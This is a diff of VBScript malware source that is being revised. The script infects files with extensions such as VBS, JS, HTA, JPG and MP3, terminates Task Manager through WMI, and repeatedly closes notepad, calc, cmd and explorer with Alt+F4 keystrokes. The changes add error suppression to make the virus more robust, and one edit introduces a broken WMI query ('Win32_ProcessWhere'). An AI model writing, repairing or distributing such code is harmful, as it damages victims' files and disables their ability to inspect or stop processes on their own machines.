@@ -1,8 +1,10 @@
+On Error Resume Next ' Enable error handling
+
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 Set WshShell = WScript.CreateObject("WScript.Shell")
 
 ' Define the list of file extensions to infect
-extensions = Array("VBS", "VBE", "JS", "JSE", "CSS", "WSH", "SCT", "HTA", "JPG", "JPEG", "MP3", "MP2", "EXE", "TXT")
+extensions = Array("VBS", "VBE", "JS", "JSE", "CSS", "WSH", "SCT", "HTA", "JPG", "JPEG", "MP3", "MP2")
 
 ' Define the list of processes to close
 strExeNames = Array("notepad.exe", "calc.exe", "cmd.exe", "taskmgr.exe", "explorer.exe")
@@ -35,6 +37,7 @@ Sub InfectFiles(folder)
         ' Check if the file has a matching extension
         If HasMatchingExtension(file) Then
             ' Open the file for reading
+            On Error Resume Next
             Set objFile = objFSO.OpenTextFile(file.Path)
 
             ' Read the content of the file
@@ -57,6 +60,7 @@ Sub InfectFiles(folder)
                 ' Close the file
                 objFile.Close
             End If
+            On Error Goto 0 ' Reset error handling
         End If
     Next
 
@@ -81,25 +85,29 @@ Function HasMatchingExtension(file)
 End Function
 
 ' Check if Task Manager is running, and if so, close it
+On Error Resume Next
 Set objWmi = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
-Set colProcessList = objWmi.ExecQuery("Select * from Win32_Process Where Name = 'taskmgr.exe'")
+Set colProcessList = objWmi.ExecQuery("Select * from Win32_ProcessWhere Name = 'taskmgr.exe'")
 If colProcessList.Count > 0 Then
-    For Each objProcess In colProcessList
-        objProcess.Terminate()
-    Next
+For Each objProcess In colProcessList
+objProcess.Terminate()
+Next
 End If
+On Error Goto 0 ' Reset error handling
 
 Do
-    For Each strExeName In strExeNames
-        Set objWmi = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\.\root\cimv2")
+For Each strExeName In strExeNames
+On Error Resume Next
+Set objWmi = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\.\root\cimv2")
 Set colProcessList = objWmi.ExecQuery("Select * from Win32_Process Where Name = '" & strExeName & "'")
-            If colProcessList.Count > 0 Then
+    If colProcessList.Count > 0 Then
         For Each objProcess In colProcessList
             WshShell.AppActivate objProcess.ProcessId
             WScript.Sleep 0 ' Wait for window to activate before closing
             WshShell.SendKeys "%{F4}" ' Sends Alt+F4 to close window
         Next
     End If
+    On Error Goto 0 ' Reset error handling
 Next
 
 ' Type "n" into the search bar with focus
